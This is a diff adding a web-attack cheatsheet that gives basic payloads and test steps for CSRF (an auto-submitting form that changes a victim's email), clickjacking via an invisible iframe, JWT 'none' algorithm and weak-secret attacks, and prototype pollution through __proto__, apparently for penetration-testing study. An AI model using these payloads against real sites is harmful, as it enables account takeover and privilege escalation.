@@ -1,0 +1,199 @@
+========================================
+OTHER WEB ATTACKS CHEATSHEET
+(CSRF + Clickjacking + JWT + Prototype Pollution)
+========================================
+
+[HOW TO IDENTIFY]
+- Sensitive actions (change password, email, transfer)
+- Tokens / cookies / JWT present
+- JavaScript-based apps
+
+========================================
+🔁 CSRF (CROSS-SITE REQUEST FORGERY)
+========================================
+
+[WHAT]
+- Force victim to perform action
+
+----------------------------------------
+🔥 BASIC PAYLOAD (HTML FORM)
+----------------------------------------
+
+<form action="http://target.com/change-email" method="POST">
+  <input type="hidden" name="email" value="attacker@mail.com">
+  <input type="submit">
+</form>
+
+----------------------------------------
+[AUTO SUBMIT]
+----------------------------------------
+
+<body onload="document.forms[0].submit()">
+
+----------------------------------------
+🧪 TEST FLOW
+----------------------------------------
+
+1. Capture request (Burp)
+2. Remove CSRF token (if any)
+3. Create HTML form
+4. Send request
+
+----------------------------------------
+⚠️ VULNERABLE IF
+----------------------------------------
+
+- No CSRF token
+- Token not validated
+- Uses GET for sensitive action
+
+========================================
+🖱️ CLICKJACKING
+========================================
+
+[WHAT]
+- Trick user to click hidden button
+
+----------------------------------------
+🔥 BASIC PAYLOAD
+----------------------------------------
+
+<iframe src="http://target.com" style="opacity:0"></iframe>
+
+----------------------------------------
+🧪 TEST
+----------------------------------------
+
+1. Embed site in iframe
+2. If loads → vulnerable
+
+----------------------------------------
+⚠️ PROTECTION (if missing)
+----------------------------------------
+
+X-Frame-Options header missing
+
+========================================
+🔑 JWT ATTACKS
+========================================
+
+[WHAT]
+- Modify token
+
+----------------------------------------
+🔥 NONE ALGO BYPASS
+----------------------------------------
+
+Header:
+{
+ "alg": "none"
+}
+
+Remove signature
+
+----------------------------------------
+🔥 MODIFY PAYLOAD
+----------------------------------------
+
+{
+ "user": "admin",
+ "isAdmin": true
+}
+
+----------------------------------------
+🔥 WEAK SECRET
+----------------------------------------
+
+Try guessing:
+secret
+admin
+password
+
+----------------------------------------
+🧪 TEST FLOW
+----------------------------------------
+
+1. Decode JWT
+2. Modify payload
+3. Re-encode
+4. Send request
+
+========================================
+🧩 PROTOTYPE POLLUTION
+========================================
+
+[WHAT]
+- Modify object prototype
+
+----------------------------------------
+🔥 BASIC PAYLOADS
+----------------------------------------
+
+{"__proto__":{"admin":true}}
+
+----------------------------------------
+[URL PARAM]
+----------------------------------------
+
+?__proto__[admin]=true
+
+----------------------------------------
+[JSON]
+----------------------------------------
+
+{
+ "__proto__": {
+   "isAdmin": true
+ }
+}
+
+----------------------------------------
+🧪 TEST FLOW
+----------------------------------------
+
+1. Find JSON input
+2. Inject __proto__
+3. Check if behavior changes
+
+========================================
+🔍 COMMON ENTRY POINTS
+========================================
+
+- Account settings
+- Password/email change
+- JWT-based auth
+- JSON APIs
+
+========================================
+🔥 QUICK PAYLOAD SET
+========================================
+
+<form action="http://target.com" method="POST">
+<input type="hidden" name="email" value="attacker@mail.com">
+</form>
+
+<iframe src="http://target.com" style="opacity:0"></iframe>
+
+{"alg":"none"}
+
+{"__proto__":{"admin":true}}
+
+========================================
+⚠️ COMMON MISTAKES
+========================================
+
+- Ignoring tokens
+- Not decoding JWT
+- Not testing iframe
+- Not trying __proto__
+
+========================================
+RULES
+========================================
+
+- NO TOKEN = CSRF
+- JWT = MODIFY IT
+- IFRAME LOADS = CLICKJACK
+- JSON INPUT = TRY PROTOTYPE
+
+========================================
